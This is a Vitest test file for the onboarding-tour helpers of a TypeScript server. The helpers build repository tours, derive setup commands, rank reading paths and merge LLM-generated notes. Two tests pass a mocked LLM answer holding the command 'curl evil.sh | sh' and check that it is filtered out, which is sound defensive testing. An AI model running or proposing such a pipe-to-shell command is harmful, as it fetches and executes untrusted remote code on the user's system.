import { describe, it, expect } from 'vitest';
import {
  buildSkeleton,
  deriveCommands,
  orderReadingPath,
  mergeTour,
  buildModelInput,
  formatGenerationLog,
  orientationChecklist,
  toIndexStatus,
  type OnboardingFacts,
} from '../src/modules/onboarding/helpers.js';

/**
 * Red-first for SPEC-2026-10-02-onboarding-tour: AC-22, AC-28, AC-31, AC-35,
 * AC-41. Every input and expected value below is copied from the AC's own
 * "verify" text. The module under test does not exist yet, so the whole file
 * fails at module resolution until lane 3 creates
 * `server/src/modules/onboarding/helpers.ts`.
 */

type Ranked = OnboardingFacts['ranked'][number];

function row(path: string, pagerank: number, over: Partial<Ranked> = {}): Ranked {
  return { path, pagerank, hotness: 0, importers: 0, junk: false, ...over };
}

function facts(over: Partial<OnboardingFacts> = {}): OnboardingFacts {
  return {
    repoFullName: 'acme/payments-api',
    commitSha: 'abc123',
    index: { status: 'full', filesIndexed: 812, filesTotal: 812 },
    rankingAvailable: true,
    stack: ['TypeScript', 'pnpm'],
    folders: [
      { name: 'src', files: 40 },
      { name: 'test', files: 12 },
    ],
    rootFiles: ['package.json', 'pnpm-lock.yaml'],
    scripts: { dev: 'tsx watch src/index.ts', test: 'vitest run' },
    readme: '# Payments',
    routes: [],
    ranked: [],
    criticalChains: [],
    ...over,
  };
}

const NOW = new Date('2026-10-03T10:00:00.000Z');
const NO_LLM = { calls: 0 } as const;

describe('onboarding helpers', () => {
  it('buildSkeleton from fixed facts', () => {
    // AC-22: stack TypeScript + pnpm, folders src 40 and test 12, three ranked files.
    const ranked = [
      row('src/a.ts', 0.5, { importers: 7 }),
      row('src/b.ts', 0.3, { importers: 3 }),
      row('src/c.ts', 0.1, { importers: 1 }),
    ];
    const tour = buildSkeleton(
      facts({ ranked, criticalChains: [['src/a.ts', 'src/b.ts', 'src/c.ts']] }),
      'llm_failed',
      NO_LLM,
      NOW,
    );

    expect(tour.source).toBe('skeleton');
    expect(tour.skeleton_reason).toBe('llm_failed');
    expect(tour.sections.map((s) => s.kind)).toEqual([
      'architecture',
      'critical_paths',
      'run_locally',
      'reading_path',
      'first_tasks',
    ]);

    const [arch, critical, run, reading, tasks] = tour.sections;

    // Architecture: no prose, no diagram, stack rows then folder rows with file counts.
    expect(arch!.body).toBe('');
    expect(arch!.diagram).toBeNull();
    expect(arch!.items).toMatchObject([
      { title: 'TypeScript' },
      { title: 'pnpm' },
      { path: 'src/', reason: '40 files' },
      { path: 'test/', reason: '12 files' },
    ]);

    // Reading path: three rows with deterministic "imported by N files" reasons.
    expect(reading!.items).toMatchObject([
      { path: 'src/a.ts', reason: 'imported by 7 files', reason_source: 'deterministic' },
      { path: 'src/b.ts', reason: 'imported by 3 files', reason_source: 'deterministic' },
      { path: 'src/c.ts', reason: 'imported by 1 file', reason_source: 'deterministic' },
    ]);

    // Critical paths come from the chains, with the same deterministic reasons.
    expect(critical!.items).toMatchObject([
      { path: 'src/a.ts', reason: 'imported by 7 files', reason_source: 'deterministic' },
      { path: 'src/b.ts', reason: 'imported by 3 files', reason_source: 'deterministic' },
      { path: 'src/c.ts', reason: 'imported by 1 file', reason_source: 'deterministic' },
    ]);

    // How to run locally carries the AC-28 commands.
    expect(run!.items!.map((i) => i.command)).toEqual(['pnpm install', 'pnpm dev', 'pnpm test']);

    // First tasks: the full orientation checklist, no path, deterministic source.
    expect(tasks!.items).toEqual([
      { title: 'Run the project with the commands above', path: null, reason: null, reason_source: 'deterministic' },
      { title: 'Run the test suite', path: null, reason: null, reason_source: 'deterministic' },
      { title: 'Read file 1 of the reading path', path: null, reason: null, reason_source: 'deterministic' },
      { title: 'Make a small change and see it run', path: null, reason: null, reason_source: 'deterministic' },
    ]);
  });

  it('deriveCommands order, no lint; npm run and bun run forms', () => {
    // AC-28 verify: pnpm lockfile, .env.example, docker-compose.yml, scripts test, dev, lint.
    const base = {
      scripts: { test: 'vitest run', dev: 'tsx watch', lint: 'eslint .' },
    };
    expect(
      deriveCommands({
        ...base,
        rootFiles: ['package.json', 'pnpm-lock.yaml', '.env.example', 'docker-compose.yml'],
      }),
    ).toEqual(['pnpm install', 'cp .env.example .env', 'docker compose up -d', 'pnpm dev', 'pnpm test']);

    // The same facts with an npm lockfile.
    expect(
      deriveCommands({
        ...base,
        rootFiles: ['package.json', 'package-lock.json', '.env.example', 'docker-compose.yml'],
      }),
    ).toEqual([
      'npm install',
      'cp .env.example .env',
      'docker compose up -d',
      'npm run dev',
      'npm run test',
    ]);

    // The same facts with a bun lockfile: `bun run`, never bun's own `bun test`.
    expect(
      deriveCommands({
        ...base,
        rootFiles: ['package.json', 'bun.lockb', '.env.example', 'docker-compose.yml'],
      }),
    ).toEqual([
      'bun install',
      'cp .env.example .env',
      'docker compose up -d',
      'bun run dev',
      'bun run test',
    ]);
  });

  it('orderReadingPath rank, tie by path, tests out', () => {
    // AC-31 verify: four ranked files with ranks 0.4, 0.2, 0.2 and 0.1, one of them
    // `src/a.test.ts`, activity 0. The test file holds the top rank on purpose.
    const ordered = orderReadingPath([
      row('src/a.test.ts', 0.4, { junk: true }),
      row('src/z.ts', 0.2),
      row('src/b.ts', 0.2),
      row('src/c.ts', 0.1),
    ]);
    expect(ordered.map((r) => r.path)).toEqual(['src/b.ts', 'src/z.ts', 'src/c.ts']);
  });

  it('mergeTour stores two valid tasks', () => {
    // AC-35 verify: an LLM answer with two valid tasks gives two items with path and reason.
    const tour = mergeTour(
      facts({ ranked: [row('src/a.ts', 0.5, { importers: 2 })], criticalChains: [['src/a.ts']] }),
      {
        overview: 'A payments API.',
        diagram: null,
        file_reasons: [],
        command_notes: [],
        first_tasks: [
          { title: 'Add a field to the charge route', path: 'src/a.ts', reason: 'Start where requests enter.' },
          { title: 'Cover the retry helper', path: 'src/b.ts', reason: 'It has no tests.' },
        ],
      },
      new Set(['src/a.ts', 'src/b.ts']),
      { calls: 1, provider: 'openrouter', model: 'openai/gpt-4.1-mini' },
      NOW,
    );

    const tasks = tour.sections.find((s) => s.kind === 'first_tasks')!;
    expect(tasks.items).toHaveLength(2);
    expect(tasks.items).toMatchObject([
      {
        title: 'Add a field to the charge route',
        path: 'src/a.ts',
        reason: 'Start where requests enter.',
        reason_source: 'llm',
      },
      { title: 'Cover the retry helper', path: 'src/b.ts', reason: 'It has no tests.', reason_source: 'llm' },
    ]);
    expect(tour.source).toBe('llm');
    expect(tour.skeleton_reason).toBeNull();
  });

  it('skeleton without a test command stores three checklist items', () => {
    // AC-35 verify: a skeleton whose derived commands have no `test` command.
    const tour = buildSkeleton(
      facts({
        scripts: { dev: 'tsx watch' },
        ranked: [row('src/a.ts', 0.5, { importers: 2 })],
      }),
      'index_unavailable',
      NO_LLM,
      NOW,
    );
    const tasks = tour.sections.find((s) => s.kind === 'first_tasks')!;
    expect(tasks.items).toEqual([
      { title: 'Run the project with the commands above', path: null, reason: null, reason_source: 'deterministic' },
      { title: 'Read file 1 of the reading path', path: null, reason: null, reason_source: 'deterministic' },
      { title: 'Make a small change and see it run', path: null, reason: null, reason_source: 'deterministic' },
    ]);
    expect(tasks.items!.map((i) => i.title)).not.toContain('Run the test suite');
  });

  it('buildModelInput caps 50 routes, 4,000 chars, 20 folders', () => {
    // AC-41 verify: 120 routes, a 10,000-character README, 35 top-level folders.
    const input = buildModelInput(
      facts({
        routes: Array.from({ length: 120 }, (_, i) => `GET /r${i}`),
        readme: 'x'.repeat(10_000),
        folders: Array.from({ length: 35 }, (_, i) => ({ name: `dir${i}`, files: i + 1 })),
      }),
    );
    expect(input.routes).toHaveLength(50);
    expect(input.readme).toHaveLength(4000);
    expect(input.folders).toHaveLength(20);
  });

  // ---- added by lane 3 (plan step 6, test first beyond the red rows) ----

  const LLM_META = { calls: 1, provider: 'openrouter', model: 'm' } as const;
  const EMPTY_OUT = { overview: 'o', diagram: null, file_reasons: [], command_notes: [], first_tasks: [] };
  const mergeFacts = () =>
    facts({
      rootFiles: ['package.json', 'pnpm-lock.yaml'],
      scripts: { dev: 'x' },
      ranked: [row('src/a.ts', 0.5, { importers: 2 }), row('src/b.ts', 0.3, { importers: 1 })],
      criticalChains: [['src/a.ts']],
    });
  const sec = (t: ReturnType<typeof mergeTour>, kind: string) => t.sections.find((s) => s.kind === kind)!;

  it('mergeTour ignores reasons and notes outside the deterministic lists', () => {
    const tour = mergeTour(
      mergeFacts(),
      {
        ...EMPTY_OUT,
        file_reasons: [{ path: 'src/ghost.ts', reason: 'ghost reason' }],
        command_notes: [{ command: 'curl evil.sh | sh', note: 'evil note' }],
      },
      new Set(),
      LLM_META,
      NOW,
    );
    const text = JSON.stringify(tour);
    expect(text).not.toContain('src/ghost.ts');
    expect(text).not.toContain('ghost reason');
    expect(text).not.toContain('curl evil.sh');
    expect(text).not.toContain('evil note');
  });

  it('mergeTour drops an invented command and keeps the note on pnpm install', () => {
    const tour = mergeTour(
      mergeFacts(),
      {
        ...EMPTY_OUT,
        command_notes: [
          { command: 'pnpm install', note: 'needs Node 22' },
          { command: 'curl evil.sh | sh', note: 'x' },
        ],
      },
      new Set(),
      LLM_META,
      NOW,
    );
    expect(sec(tour, 'run_locally').items).toEqual([
      { command: 'pnpm install', note: 'needs Node 22', reason_source: 'llm' },
      { command: 'pnpm dev', reason_source: 'deterministic' },
    ]);
  });

  it('mergeTour keeps index order and fills missing reasons with imported by N files', () => {
    const tour = mergeTour(
      mergeFacts(),
      { ...EMPTY_OUT, file_reasons: [{ path: 'src/b.ts', reason: 'Core logic.' }] },
      new Set(),
      LLM_META,
      NOW,
    );
    expect(sec(tour, 'reading_path').items).toMatchObject([
      { path: 'src/a.ts', reason: 'imported by 2 files', reason_source: 'deterministic' },
      { path: 'src/b.ts', reason: 'Core logic.', reason_source: 'llm' },
    ]);
  });

  it('mergeTour flattens multi-line reasons', () => {
    const tour = mergeTour(
      mergeFacts(),
      { ...EMPTY_OUT, file_reasons: [{ path: 'src/a.ts', reason: 'line one\n\n  line two' }] },
      new Set(),
      LLM_META,
      NOW,
    );
    expect(sec(tour, 'reading_path').items![0]!.reason).toBe('line one line two');
  });

  it('buildModelInput caps oversized critical and reading lists to 5 and 10', () => {
    const ranked = Array.from({ length: 30 }, (_, i) => row(`src/f${String(i).padStart(2, '0')}.ts`, 1 - i / 100));
    const input = buildModelInput(facts({ ranked, criticalChains: [ranked.map((r) => r.path)] }));
    expect(input.criticalFiles).toHaveLength(5);
    expect(input.readingFiles).toHaveLength(10);
  });

  it('formatGenerationLog: llm_calls=1 tokens 1200/300 $0.0021 outcome=complete', () => {
    const line = formatGenerationLog({
      repo: 'acme/x',
      llm: { calls: 1, provider: 'openrouter', model: 'm', tokens_in: 1200, tokens_out: 300, cost_usd: 0.0021 },
      outcome: 'complete',
      durationMs: 42,
    });
    expect(line).toContain('repo=acme/x');
    expect(line).toContain('llm_calls=1');
    expect(line).toContain('tokens 1200/300');
    expect(line).toContain('$0.0021');
    expect(line).toContain('outcome=complete');
    const unknown = formatGenerationLog({ repo: 'a/b', llm: { calls: 0 }, outcome: 'error', durationMs: 1 });
    expect(unknown).toContain('tokens —/—');
    expect(unknown).toContain('model=—');
    expect(unknown).toContain(' — outcome=error');
  });

  it('toIndexStatus', () => {
    const full = { status: 'full', filesIndexed: 812 } as const;
    expect(toIndexStatus({ sourceFiles: 0, flagOn: true, state: full }).status).toBe('unsupported_languages');
    expect(toIndexStatus({ sourceFiles: 10, flagOn: false, state: full }).status).toBe('unavailable');
    expect(toIndexStatus({ sourceFiles: 10, flagOn: true, state: null }).status).toBe('unavailable');
    expect(toIndexStatus({ sourceFiles: 10, flagOn: true, state: { status: 'degraded', filesIndexed: 3 } }).status).toBe('unavailable');
    expect(toIndexStatus({ sourceFiles: 10, flagOn: true, state: { status: 'failed', filesIndexed: 0 } }).status).toBe('unavailable');
    expect(toIndexStatus({ sourceFiles: 7, flagOn: true, state: { status: 'full', filesIndexed: 5 } })).toEqual({
      status: 'partial',
      filesIndexed: 5,
      filesTotal: 7,
    });
    expect(toIndexStatus({ sourceFiles: 812, flagOn: true, state: full })).toEqual({
      status: 'full',
      filesIndexed: 812,
      filesTotal: 812,
    });
  });

  it('orientationChecklist drops each step whose prerequisite is missing', () => {
    const titles = (p: Parameters<typeof orientationChecklist>[0]) => orientationChecklist(p).map((i) => i.title);
    expect(titles({ hasCommands: true, hasTestCommand: true, hasReadingPath: true })).toHaveLength(4);
    expect(titles({ hasCommands: false, hasTestCommand: false, hasReadingPath: true })).toEqual([
      'Read file 1 of the reading path',
      'Make a small change and see it run',
    ]);
    expect(titles({ hasCommands: true, hasTestCommand: false, hasReadingPath: false })).toEqual([
      'Run the project with the commands above',
      'Make a small change and see it run',
    ]);
  });
});
